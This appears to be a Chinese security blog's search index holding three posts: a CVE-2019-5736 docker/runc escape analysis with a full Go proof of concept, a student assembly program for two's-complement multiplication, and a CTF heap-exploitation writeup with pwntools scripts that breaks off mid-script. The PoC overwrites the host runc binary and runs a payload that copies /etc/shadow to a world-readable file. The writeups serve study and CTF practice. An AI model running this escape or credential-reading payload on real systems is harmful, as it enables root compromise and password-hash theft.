<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[CVE-2019-5736 docker逃逸分析]]></title>
    <url>%2F2019%2F05%2F14%2FCVE-2019-5736-docker%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[漏洞简介runc是一个根据OCI(Open Container Initiative)标准创建并运行容器的CLI tool，目前Docker、Containerd和CRI-O等容器都运行在runc之上。 该漏洞允许恶意容器(以最少的用户交互)覆盖 host 上的runC 文件，从而在 host 上以root 权限执行代码。在下面两种情况下，通过用户交互可以在容器中以root 权限执行任意代码： 使用攻击者控制的映像创建新容器。 将（docker exec）附加到攻击者之前具有写入权限的现有容器中。 漏洞影响 Ubuntu：runc 1.0.0~rc4+dfsg1-6ubuntu0.18.10.1之前版本 Debian：runc 0.1.1+dfsg1-2 之前版本 RedHat Enterprise Linux： docker 1.13.1-91.git07f3374.el7之前版本 Amazon Linux：docker 18.06.1ce-7.25.amzn1.x86_64之前版本 CoreOS：2051.0.0之前版本 Kops Debian 所有版本（正在修复） Docker：18.09.2之前版本 看了漏洞影响之后，emm，感觉范围并不大，对相关版本的要求挺苛刻的，原因在于要考虑到POC的稳定性和可靠性，所以在有些版本下也会复现失败 环境搭建 ubuntu16.04 go语言编译环境 docker 18.03.1-ce 漏洞分析与漏洞相关的两条命令如下： / proc / self / exe - 进程正在运行的可执行文件的符号链接 / proc / self / fd - 包含进程打开的文件描述符的目录 我们可以用 ls -l /proc/self列出/proc/self下的文件 可以看到访问/proc/self的是我们的’ls’进程 这里可以看到/proc/{pid}/exe就是指向的所运行的文件 通过 docker exec -it xxx /bin/bash，可以进入容器内执行命令，需要想办法拿到 runc 的pid 从而获取 runc 的软链接 当用户调用docker exec的时候，相当于runc 调用/bin/sh,而/bin/sh被我们改为#!/proc/self/exe，即runc运行自身，而runc自身也被我们修改了，所以相当于runc执行了我们的代码 漏洞利用 将/bin/sh替换为#!/proc/self/exe 寻找runc的pid，获取runc的软连接 获取其文件描述符fd,进行写操作 尝试写入payload,写成功之后覆盖原有runc 1.exec poc这个POC相当于一个trap，攻击者需要获取容器中的命令执行，并监听一个恶意二进制文件。如果有攻击者或受害者使用docker exec进入容器，就会触发漏洞利用，恶意代码就可以以root权限运行（go语言） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package main&#x2F;&#x2F; Implementation of CVE-2019-5736&#x2F;&#x2F; Created with help from @singe, @_cablethief, and @feexd.&#x2F;&#x2F; This commit also helped a ton to understand the vuln&#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;lxc&#x2F;lxc&#x2F;commit&#x2F;6400238d08cdf1ca20d49bafb85f4e224348bf9dimport ( &quot;fmt&quot; &quot;io&#x2F;ioutil&quot; &quot;os&quot; &quot;strconv&quot; &quot;strings&quot;)&#x2F;&#x2F; This is the line of shell commands that will execute on the hostvar payload &#x3D; &quot;#!&#x2F;bin&#x2F;bash \n cat &#x2F;etc&#x2F;shadow &gt; &#x2F;tmp&#x2F;shadow &amp;&amp; chmod 777 &#x2F;tmp&#x2F;shadow&quot;func main() &#123; &#x2F;&#x2F; First we overwrite &#x2F;bin&#x2F;sh with the &#x2F;proc&#x2F;self&#x2F;exe interpreter path fd, err :&#x3D; os.Create(&quot;&#x2F;bin&#x2F;sh&quot;) if err !&#x3D; nil &#123; fmt.Println(err) return &#125; fmt.Fprintln(fd, &quot;#!&#x2F;proc&#x2F;self&#x2F;exe&quot;) err &#x3D; fd.Close() if err !&#x3D; nil &#123; fmt.Println(err) return &#125; fmt.Println(&quot;[+] Overwritten &#x2F;bin&#x2F;sh successfully&quot;) &#x2F;&#x2F; Loop through all processes to find one whose cmdline includes runcinit &#x2F;&#x2F; This will be the process created by runc var found int for found &#x3D;&#x3D; 0 &#123; pids, err :&#x3D; ioutil.ReadDir(&quot;&#x2F;proc&quot;) if err !&#x3D; nil &#123; fmt.Println(err) return &#125; for _, f :&#x3D; range pids &#123; fbytes, _ :&#x3D; ioutil.ReadFile(&quot;&#x2F;proc&#x2F;&quot; + f.Name() + &quot;&#x2F;cmdline&quot;) fstring :&#x3D; string(fbytes) if strings.Contains(fstring, &quot;runc&quot;) &#123; fmt.Println(&quot;[+] Found the PID:&quot;, f.Name()) found, err &#x3D; strconv.Atoi(f.Name()) if err !&#x3D; nil &#123; fmt.Println(err) return &#125; &#125; &#125; &#125; &#x2F;&#x2F; We will use the pid to get a file handle for runc on the host. var handleFd &#x3D; -1 for handleFd &#x3D;&#x3D; -1 &#123; &#x2F;&#x2F; Note, you do not need to use the O_PATH flag for the exploit to work. handle, _ :&#x3D; os.OpenFile(&quot;&#x2F;proc&#x2F;&quot;+strconv.Itoa(found)+&quot;&#x2F;exe&quot;, os.O_RDONLY, 0777) if int(handle.Fd()) &gt; 0 &#123; handleFd &#x3D; int(handle.Fd()) &#125; &#125; fmt.Println(&quot;[+] Successfully got the file handle&quot;) &#x2F;&#x2F; Now that we have the file handle, lets write to the runc binary and overwrite it &#x2F;&#x2F; It will maintain it&#39;s executable flag for &#123; writeHandle, _ :&#x3D; os.OpenFile(&quot;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) &gt; 0 &#123; fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle) writeHandle.Write([]byte(payload)) return &#125; &#125;&#125; 2.malicious image poc第二个POC创建了一个恶意Docker镜像。如果该恶意镜像运行就会触发漏洞利用。 漏洞的利用需要在容器内获取root(uid 0)权限 这里简单做了一个演示视频： 补丁分析在补丁中新增了一些函数，用于处理克隆二进制文件，关键在于新增加了一个nsexec()函数来判断是否来自克隆文件 ensure_cloned_binary()中又调用了is_self_cloned()方法 通过对文件描述符执行F_GET_SEALS操作是否成功判断是否为克隆文件描述符 如果is_self_cloned()的返回值大于0，都会直接返回。否则则执行clone_binary()创建克隆文件 参考https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d https://github.com/twistlock/RunC-CVE-2019-5736 https://github.com/Frichetten/CVE-2019-5736-PoC https://www.twistlock.com/labs-blog/breaking-docker-via-runc-explaining-cve-2019-5736/]]></content>
      <tags>
        <tag>CVE-2019-5736</tag>
        <tag>cve</tag>
        <tag>docker escape</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[补码1位乘法(16位汇编实现)]]></title>
    <url>%2F2019%2F04%2F26%2F%E8%A1%A5%E7%A0%81%E4%B8%80%E4%BD%8D%E4%B9%98%E6%B3%95(16%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AE%9E%E7%8E%B0)%2F</url>
    <content type="text"><![CDATA[大三上学期有计算机操作系统原理这门课，老师要求每位同学期末前用代码实现补码一位乘法算法，当时正好在看王爽的汇编书籍，于是干脆用16位汇编实现了此算法。但是当时我也不知道自己怎么想的，没有用neg、not等求补的指令，反而是运用了字符串，获取一个字符串后，判断碰见“1”取“0”，碰见“0”取“1”。这样的代价就是，会用接近100行汇编代码实现一个求补的功能，更别说还要实现变补、位移的功能。所以最终的代码多达600多行，十分的冗余，不过全当练习了，233333。算法原理运算规则(1) 如果 yn = yn+1，部分积 [ zi ] 加0，再右移一位；(2) 如果 yn yn+1 = 01，部分积加[ x ]补，再右移一位；(3) 如果 yn yn+1 = 10，部分积加[ - x]补，再右移一位；这样重复进行 n+1 步，但最后一步不移位。包括一位符号位，所得乘积为 2n+1 位，其中 n 为尾数位数。 举个栗子 程序演示运行汇编的环境用的是DOSBox,下载地址在这，编译环境用的masm5.0，下载地址在这 汇编代码真的我自己都觉得十分冗余了，但是作为初学汇编的练习也很不错，成品.asm文件在我的github. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656DATA SEGMENT INPUT0 DB &quot;Automatic identification without inputing point!&quot;,&#39;$&#39;INPUT1 DB &quot;Please input a bin string: &quot;,&#39;$&#39; INPUT2 DB &quot;Please input another bin string: &quot;,&#39;$&#39; STR1 DB &quot;X&#x3D;&quot;,&#39;$&#39;STR2 DB &quot;Y&#x3D;&quot;,&#39;$&#39;STR3 DB &quot;-[X]&#x3D;&quot;,&#39;$&#39;STR4 DB &quot;[X]&#x3D;&quot;,&#39;$&#39;STR5 DB &quot;[Y]&#x3D;&quot;,&#39;$&#39;STR6 DB &quot;[XY]&#x3D;&quot;,&#39;$&#39;BUFFER1 DB 20 ;获取XN1 DB ? ;自动获取输入的字符个数DB 20 DUP(0)BUFFER2 DB 20 ;获取YN2 DB ?DB 20 DUP(0) FX DB 20DB 20 DUP(0) X DB 20DB 20 DUP(0) Y DB 20DB 20 DUP(0) C DB 20 DB 20 DUP(0) ;部分积CRLF DB 0AH, 0DH,&#39;$&#39; DATA ENDS CODE SEGMENT ASSUME CS:CODE, DS:DATA START: MOV AX, DATA MOV DS, AX LEA DX, INPUT0 ;打印提示输入信息 MOV AH, 09H INT 21H LEA DX, CRLF ;另取一行 MOV AH, 09H INT 21H LEA DX, INPUT1 MOV AH, 09H INT 21H LEA DX, BUFFER1 ;接收字符串 MOV AH, 0AH INT 21H MOV AL, N1 ADD AL, 2 ;对字符串处理 MOV AH, 0 MOV SI, AX MOV BUFFER1[SI], &#39;$&#39; LEA DX, CRLF ;另取一行 MOV AH, 09H INT 21H LEA DX, INPUT2 MOV AH, 09H INT 21H LEA DX, BUFFER2 MOV AH, 0AH INT 21H MOV AL, N2 ADD AL, 2 MOV AH, 0 MOV SI, AX MOV BUFFER2[SI], &#39;$&#39; LEA DX, CRLF MOV AH, 09H INT 21H LEA DX, CRLF MOV AH, 09H INT 21H LEA DX, STR1 MOV AH, 09H INT 21H LEA DX, BUFFER1+2 MOV AH, 09H INT 21H MOV AH,2 MOV DL,20H INT 21H MOV AH,2 MOV DL,20H INT 21H LEA DX, STR2 ;打印Y信息 MOV AH, 09H INT 21H LEA DX, BUFFER2+2 MOV AH, 09H INT 21H;[X]---------------------------- XOR DX, DXSYMBOL1: MOV DL, BUFFER1[2] CMP DL, &#39;-&#39; JZ SYMBOL2 CMP DL, &#39;1&#39; JZ DEAL2 MOV BL, N1 ;为正补一个0 MOV BH, 0 ADD BX, 1 MOV CX, BX MOV SI, BXFOR1: MOV DL, BUFFER1[BX] MOV BUFFER1[BX+1], DL DEC BX LOOP FOR1 MOV DL, &#39;0&#39; MOV BUFFER1[2], DL MOV BUFFER1[SI+2], &#39;$&#39; MOV DL, N1 INC DL MOV N1, DL JMP ZHENGDEAL2: MOV BL, N1 ;为负补一个1 MOV BH, 0 ADD BX, 1 MOV CX, BX MOV SI, BXFOR2: MOV DL, BUFFER1[BX] MOV BUFFER1[BX+1], DL DEC BX LOOP FOR2 MOV DL, &#39;1&#39; MOV BUFFER1[2], DL MOV BUFFER1[SI+2], &#39;$&#39; MOV DL, N1 INC DL MOV N1, DL JMP BUMA1SYMBOL2: MOV DL, BUFFER1[3] CMP DL, &#39;1&#39; JZ DEAL1 ;-1为正 MOV DL, &#39;1&#39; ;-0为负 MOV BUFFER1[2], DL MOV BUFFER1[3], DL JMP BUMA1DEAL1: MOV DL, &#39;0&#39; MOV BUFFER1[2], DL MOV BUFFER1[3], DL ;传送原码到X保存-----------------ZHENG: LEA SI, BUFFER1+2 MOV AX, SEG X MOV ES,AX LEA DI, X MOV CH, 0 MOV CL, N1 INC CX REP MOVSB JMP YUAN1BUMA1: MOV DL, BUFFER1[2] MOV X[0], DL ;符号位不变 MOV DL, BUFFER1[3] MOV X[1], DL MOV BX, 4ZERO2: MOV DL, BUFFER1[BX] CMP DL, &#39;1&#39; JNZ ONE2 MOV DL, &#39;0&#39; MOV X[BX-2], DL INC BX JMP AGAIN2ONE2: MOV DL, &#39;1&#39; MOV X[BX-2], DL INC BXAGAIN2: CMP BUFFER1[BX], &#39;$&#39; JNZ ZERO2PRINT1: MOV CX, 10 MOV DL, N1 MOV DH, 0 MOV BX, DX DEC BX MOV AX, BXS2: MOV DL, X[BX] CMP DL, &#39;0&#39; JZ ONE5 DEC BX LOOP S2 ONE5: MOV DL, X[BX] CMP DL, &#39;0&#39; JNZ ZERO5 MOV DL, &#39;1&#39; MOV X[BX], DL INC BX JMP AGAIN5ZERO5: MOV DL, &#39;0&#39; MOV X[BX], DL INC BXAGAIN5: CMP BX, AX JBE ONE5YUAN1: MOV BL, N1 MOV BH, 0 MOV SI, BX MOV X[SI],&#39;$&#39; LEA DX, CRLF ;另取一行 MOV AH, 09H INT 21H LEA DX, STR4 ;打印[x]信息 MOV AH, 09H INT 21H LEA DX, X MOV AH, 09H INT 21H;[-X]-------------------------- XOR DX, DX MOV SI, 4 MOV DL, X[0] CMP DL, &#39;1&#39; JZ QUFU MOV DL, &#39;1&#39; MOV FX[0], DL MOV FX[1], DLBUMA3: MOV BX, 2ZERO7: MOV DL, X[BX] CMP DL, &#39;1&#39; JNZ ONE7 MOV DL, &#39;0&#39; MOV FX[BX], DL INC BX JMP AGAIN7ONE7: MOV DL, &#39;1&#39; MOV FX[BX], DL INC BXAGAIN7: CMP X[BX], &#39;$&#39; JNZ ZERO7 MOV CX, 10 MOV DL, N1 MOV DH, 0 MOV BX, DX DEC BX MOV AX, BXS5: MOV DL, FX[BX] CMP DL, &#39;0&#39; JZ ONE8 DEC BX LOOP S5 ONE8: MOV DL, FX[BX] CMP DL, &#39;0&#39; JNZ ZERO8 MOV DL, &#39;1&#39; MOV FX[BX], DL INC BX JMP AGAIN8ZERO8: MOV DL, &#39;0&#39; MOV FX[BX], DL INC BXAGAIN8: CMP BX, AX JBE ONE8 JMP PRINT3QUFU: MOV DL, &#39;0&#39; MOV FX[0], DL MOV FX[1], DLAGAIN1: MOV DL, BUFFER1[SI] MOV FX[SI-2], DL INC SI CMP BUFFER1[SI], &#39;$&#39; JNZ AGAIN1PRINT3: MOV BL, N1 MOV BH, 0 MOV SI, BX MOV FX[SI], &#39;$&#39; MOV AH,2 MOV DL,20H INT 21H MOV AH,2 MOV DL,20H INT 21H LEA DX, STR3 ;打印[-x]信息 MOV AH, 09H INT 21H LEA DX, FX MOV AH, 09H INT 21H;[Y]---------------------------- XOR DX, DX MOV AL, N2 MOV AH, 0 MOV SI, 4 MOV CX, AX DEC CX DEC CX MOV DL, BUFFER2[2] CMP DL, &#39;-&#39; JZ SYMBOL4 CMP DL, &#39;1&#39; JZ BUMA2 JMP ZHENG1SYMBOL4: MOV DL, BUFFER2[3] CMP DL, &#39;1&#39; JZ DEAL3 ;-1为正 MOV DL, &#39;1&#39; ;-0为负 MOV BUFFER2[2], DLXH1: MOV DL, BUFFER2[SI] MOV BUFFER2[SI-1], DL INC SI LOOP XH1 MOV SI, AX INC SI MOV BUFFER2[SI], &#39;$&#39; MOV DL, N2 DEC DL MOV N2, DL JMP BUMA2DEAL3: MOV DL, &#39;0&#39; MOV BUFFER2[2], DLXH2: MOV DL, BUFFER2[SI] MOV BUFFER2[SI-1], DL INC SI LOOP XH2 MOV SI, AX INC SI MOV BUFFER2[SI], &#39;$&#39; MOV DL, N2 DEC DL MOV N2, DL ;传送原码到Y保存-----------------ZHENG1: LEA SI, BUFFER2+2 MOV AX, SEG Y MOV ES,AX LEA DI, Y MOV CH, 0 MOV CL, N2 REP MOVSB JMP YUAN2BUMA2: MOV BX, 3 MOV DL, BUFFER2[2] MOV Y[0], DL ;符号位不变ZERO3: MOV DL, BUFFER2[BX] CMP DL, &#39;1&#39; JNZ ONE3 MOV DL, &#39;0&#39; MOV Y[BX-2], DL INC BX JMP AGAIN3ONE3: MOV DL, &#39;1&#39; MOV Y[BX-2], DL INC BXAGAIN3: CMP BUFFER2[BX], &#39;$&#39; JNZ ZERO3PRINT2: MOV CX, 10 MOV DL, N2 MOV DH, 0 MOV BX, DX DEC BX MOV AX, BXS3: MOV DL, Y[BX] CMP DL, &#39;0&#39; JZ ONE6 DEC BX LOOP S3 ONE6: MOV DL, Y[BX] CMP DL, &#39;0&#39; JNZ ZERO6 MOV DL, &#39;1&#39; MOV Y[BX], DL INC BX JMP AGAIN6ZERO6: MOV DL, &#39;0&#39; MOV Y[BX], DL INC BXAGAIN6: CMP BX, AX JBE ONE6YUAN2: MOV DL, N2 MOV DH, 0 INC DL MOV N2, DL MOV DL, N2 MOV SI, DX MOV Y[SI-1], &#39;0&#39; MOV Y[SI], &#39;$&#39;PRINT4: MOV BL, N1 MOV BH, 0 MOV SI, BX MOV Y[SI], &#39;$&#39; MOV AH,2 MOV DL,20H INT 21H MOV AH,2 MOV DL,20H INT 21H LEA DX, STR5 ;打印[Y]信息 MOV AH, 09H INT 21H LEA DX, Y MOV AH, 09H INT 21H;至此求补码完毕-----------------------;开始计算乘法------------------------- MOV DL, N1 ;初始化部分积C MOV DH, 0 MOV CX, DX LEA BX, C MOV DL, &#39;0&#39;CHU: MOV [BX],DL INC BX LOOP CHU MOV DL, N1 MOV DH, 0 MOV BX, DX PUSH BX MOV DL, N2 MOV DH, 0 MOV SI, DX PUSH SI MOV DH, 0D1: MOV DL, 0 INC DH POP SI POP BX PUSH BX PUSH SI DEC SI CMP N2, DH JZ ESP1 CMP DH, 2 JB S0 MOV CX, SI MOV AL, C[BX-1]S1: MOV DL, Y[SI-1] MOV Y[SI], DL DEC SI LOOP S1 MOV Y[0], AL MOV CX, BX DEC CX S4: DEC BX MOV DL, C[BX-1] MOV C[BX], DL LOOP S4 POP SI POP BX PUSH BX PUSH SI DEC SIS0: MOV AL, Y[SI] MOV DL, Y[SI-1] CMP DL, AL JZ DENG0 ;00或11 JG A10 ;10 JL A01 ;01DENG0: JMP D1 ESP0: JMP D1ESP1: JMP FINISHESP2: JMP D1A10: MOV AH, 30HB10: DEC BX MOV DL, FX[BX] MOV AL, C[BX] ADD DL, AL ADD DL, AH CMP DL, 93H JZ JW0 CMP DL, 92H JZ JW1 CMP DL, 91H JZ Z10 MOV DL, &#39;0&#39; MOV C[BX], DL CMP FX[BX-1], 0 JZ ESP0 JMP A10Z10: MOV DL, &#39;1&#39; MOV C[BX], DL CMP FX[BX-1], 0 JZ ESP0 JMP A10 JW1: MOV AH, 31H MOV DL, &#39;0&#39; MOV C[BX], DL CMP FX[BX-1], 0 JZ ESP2 JMP B10 JW0: MOV AH, 31H MOV DL, &#39;1&#39; MOV C[BX], DL CMP FX[BX-1], 0 JZ ESP0 JMP B10 ESP3: JMP ESP0ESP4: JMP FINISHESP5: JMP ESP2A01: MOV AH, 30HB01: DEC BX MOV DL, X[BX] MOV AL, C[BX] ADD DL, AL ADD DL, AH CMP DL, 93H JZ JW2 CMP DL, 92H JZ JW3 CMP DL, 91H JZ Z11 MOV DL, &#39;0&#39; MOV C[BX], DL CMP X[BX-1], 0 JZ ESP3 JMP A01Z11: MOV DL, &#39;1&#39; MOV C[BX], DL CMP X[BX-1], 0 JZ ESP3 JMP A01 JW3: MOV AH, 31H MOV DL, &#39;0&#39; MOV C[BX], DL CMP X[BX-1], 0 JZ ESP3 JMP B01 JW2: MOV AH, 31H MOV DL, &#39;1&#39; MOV C[BX], DL CMP X[BX-1], 0 JZ ESP3 JMP B01 FINISH: LEA DX, CRLF ;另取一行 MOV AH, 09H INT 21H MOV CX, 4 LEA BX, C MOV DL, N1 MOV DH, 0 MOV BX, DX MOV SI, 0S00: MOV DL, Y[SI] MOV C [BX+SI], DL INC SI LOOP S00 MOV C[1], &#39;.&#39; MOV BX, -1S01: INC BX CMP C[BX], 0 JNZ S01 MOV C[BX], &#39;$&#39; LEA DX, STR6 MOV AH, 09H INT 21H LEA DX, C MOV AH, 09H INT 21H MOV AH, 4CH ;返回DOS系统 INT 21HCODE ENDS END START]]></content>
      <tags>
        <tag>算法，汇编，asm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018铁三总决个人赛writeup]]></title>
    <url>%2F2019%2F01%2F20%2F2018%E9%93%81%E4%B8%89%E6%80%BB%E5%86%B3%E4%B8%AA%E4%BA%BA%E8%B5%9Bwriteup%2F</url>
    <content type="text"><![CDATA[上个月去北京参加了铁三总决赛，自己负责pwn，也是第二次在比赛里做pwn，三道pwn比赛时只做出来一道(littlenote)，也是很菜了。北航的师傅们一上午就AK了，赛后寻找到writeup，学习了一番，在此做下记录。 一、littlenote(fastbin attack)本题保护全开，got表不可写，pie开启 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 漏洞点在于free的时候没有将指针置0，存在悬挂指针，可以联想到UAF 1234567891011121314151617181920unsigned __int64 freenote()&#123; unsigned int v1; &#x2F;&#x2F; [rsp+4h] [rbp-Ch] unsigned __int64 v2; &#x2F;&#x2F; [rsp+8h] [rbp-8h] v2 &#x3D; __readfsqword(0x28u); puts(&quot;Which note do you want to delete?&quot;); _isoc99_scanf(&quot;%u&quot;, &amp;v1); if ( v1 &lt; (unsigned __int64)notenum ) &#123; if ( note[v1] ) free(note[v1]); puts(&quot;Done&quot;); &#125; else &#123; puts(&quot;Out of bound!&quot;); &#125; return __readfsqword(0x28u) ^ v2;&#125; 利用思路如下： 泄露heap地址：由于fastbins 的特性，我们连续 free 两个chunk，这个时候会产生一个 fastbins 的freelist 泄露libc地址：fake 一个chunk，让它分配到 unsortedbin 中，我们知道当一个chunk 在 unsortedbin中的时候，它的fd会指向 main_arena fastbin attack：在malloc_hook上面找到合适的size，在指定位置申请chunk以实现修改malloc_hook内容为onegadget 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding: utf-8 -*-from pwn import *DEBUG &#x3D; 1if DEBUG: p &#x3D; process(&#39;.&#x2F;littlenote&#39;) #p &#x3D; process(&quot;.&#x2F;littlenote&quot;, env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;.&#x2F;libc_64.so&quot;&#125;) #libc &#x3D; ELF(&quot;.&#x2F;libc.so.6&quot;) #context.log_level &#x3D; &#39;debug&#39; libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)else: p &#x3D; remote(&#39;202.120.7.218&#39;, 12321)def add_note(note,y_n&#x3D;&#39;Y&#39;): p.recvuntil(&#39;choice:\n&#39;) p.send(&#39;1\n&#39;) p.recvuntil(&#39;note\n&#39;) p.send(note) p.recvuntil(&#39;note?\n&#39;) p.send(y_n+&#39;\n&#39;)def show_note(index): p.recvuntil(&#39;choice:\n&#39;) p.send(&#39;2\n&#39;) p.recvuntil(&#39;show?\n&#39;) p.send(str(index)+&#39;\n&#39;)def delete_note(index): p.recvuntil(&#39;choice:\n&#39;) p.send(&#39;3\n&#39;) p.recvuntil(&#39;delete?\n&#39;) p.send(str(index)+&#39;\n&#39;)#1.leak heap_baseadd_note(&#39;0\n&#39;) #0add_note(&#39;1\n&#39;) #1add_note(&#39;2\n&#39;) #2add_note(&#39;3\n&#39;) #3add_note(&#39;4\n&#39;) #4add_note(&#39;5\n&#39;) #5delete_note(1)delete_note(2)show_note(2)data&#x3D;p.recv(6)+&#39;\x00\x00&#39;data&#x3D;u64(data)print dataheap_base&#x3D;data-0x70print &#39;heap_base&#x3D;&#39;,hex(heap_base)#2.leak libc_basedelete_note(1)payload&#x3D;p64(heap_base+0xd0)+p64(0)payload+&#x3D;&#39;\x00&#39;*0x40payload+&#x3D;p64(0)+p64(0x71)#payload+&#x3D;p64(0)+p64(0)add_note(payload) #5 1add_note(&#39;6\n&#39;) #6 2add_note(&#39;7\n&#39;) #7 1#payload2&#x3D;p64(0)+p64(0)payload2&#x3D;p64(0)+p64(0xe1)#payload2+&#x3D;&#39;\n&#39;add_note(payload2) #8delete_note(2)#debug(0xD0A)show_note(2)data&#x3D;p.recv(6)+&#39;\x00\x00&#39;data&#x3D;u64(data)#libc_base&#x3D;data-(0x00007f1eaa794b78-0x7f1eaa3d0000)#(0x7f222fbd2b78-0x7f222f80e000)libc_base &#x3D; data-88-(libc.symbols[&#39;__malloc_hook&#39;]+0x10)print &#39;libc_base&#x3D;&#39;,hex(libc_base)one_gadget&#x3D;libc_base+0xf0274 # 0xf02a4 0x4526a 0xf0274 0xf1117malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]print &#39;malloc_hook&#x3D;&#39;,hex(malloc_hook)print &#39;one_gadget&#x3D;&#39;,hex(one_gadget)#3.fastbin attack#add_note(&#39;9\n&#39;) #9#add_note(&#39;10\n&#39;) #10delete_note(0)delete_note(1)delete_note(0)add_note(p64(malloc_hook-0x20-3)+&#39;\n&#39;) #9 0add_note(&#39;10\n&#39;) #10 1add_note(&#39;11\n&#39;) #11 0add_note(&#39;\x00&#39;*0x13+p64(one_gadget)+&#39;\n&#39;) #12 0p.recvuntil(&#39;choice:\n&#39;)p.send(&#39;1\n&#39;)p.interactive() 二、bookstore(堆漏洞转化为栈漏洞)本题开启NX，got表同样不可写 12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 漏洞点在输入书本名字的时候，readn函数中，先将size-1，那如果输入为0，就可以进行堆溢出了 12345678910111213141516171819202122__int64 __fastcall readn(__int64 a1, int size)&#123; __int64 result; &#x2F;&#x2F; rax unsigned int v3; &#x2F;&#x2F; eax unsigned __int8 buf; &#x2F;&#x2F; [rsp+1Bh] [rbp-5h] unsigned int v5; &#x2F;&#x2F; [rsp+1Ch] [rbp-4h] v5 &#x3D; 0; while ( 1 ) &#123; result &#x3D; (unsigned int)(size - 1); if ( (unsigned int)result &lt;&#x3D; v5 ) break; read(0, &amp;buf, 1uLL); result &#x3D; buf; if ( buf &#x3D;&#x3D; 10 ) break; v3 &#x3D; v5++; *(_BYTE *)(a1 + v3) &#x3D; buf; &#125; return result;&#125; 利用思路如下： 堆溢出：构造一个smallbin大小的size，free进unsortbin中泄露libc 泄露了栈地址：通过fastbin attack在bss段的books申请chunk，覆盖book name指针，泄露environ里面存的值 在add book的时候发现一个0x40的fake fastbin size，所以后面直接利用fastbin attack在栈上申请chunk，覆盖返回地址即可，onegadget在这里行不通，索性直接pop rdi ret；system，成功getshell 这里的exp来自giantbranch大佬 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding: utf-8 -*-# @Date : 2018-12-08 19:39:57# @Author : giantbranch (giantbranch@gmail.com)# @Link : http:&#x2F;&#x2F;www.giantbranch.cn&#x2F;# @tags : from pwn import *# context.log_level &#x3D; &quot;debug&quot;p &#x3D; process(&quot;.&#x2F;bookstore&quot;)libc &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)environ_offset &#x3D; libc.symbols[&#39;environ&#39;]book_addr &#x3D; 0x602060# local libc# environ_offset &#x3D; 0x3c6f38main_arena_offset &#x3D; 0x3c4b20# one_gadget_offset &#x3D; 0xf02a4one_gadget_offset &#x3D; 0xf1147# 0x0000000000400cd3 : pop rdi ; retpop_rdi_ret &#x3D; 0x0000000000400cd3def add_book(author, size, bookname): p.recvuntil(&quot;Your choice:\n&quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;What is the author name?\n&quot;) p.sendline(author) p.recvuntil(&quot;How long is the book name?\n&quot;) p.sendline(str(size)) p.recvuntil(&quot;What is the name of the book?\n&quot;) p.sendline(bookname)def sellbook(index, ): p.recvuntil(&quot;Your choice:\n&quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;Which book do you want to sell?\n&quot;) p.sendline(str(index))def readbook(index): p.recvuntil(&quot;Your choice:\n&quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;Which book do you want to sell?\n&quot;) p.sendline(str(index))def getpid(): print proc.pidof(p)[0] pause()add_book(p64(0) + p64(0x21) , 0, &quot;a&quot; * 8)add_book(&quot;B&quot;, 0, &quot;b&quot; * 8)add_book(&quot;C&quot;, 0, &quot;c&quot; * 8)add_book(&quot;D&quot;, 0x50, &quot;d&quot; * 8)add_book(&quot;e&quot;, 0x50, p64(0) + p64(0x51))# overflow B to C and leak libcsellbook(1)add_book(&quot;a&quot;, 0, p64(0) * 3 + p64(0x91))sellbook(2)add_book(&quot;b&quot;, 0, &quot;a&quot; * 8)readbook(2)p.recvuntil(&quot;a&quot; * 8)main_arena_near &#x3D; u64(p.recvuntil(&quot;\n&quot;)[:-1].ljust(8, &quot;\x00&quot;))print &quot;main_arena_near 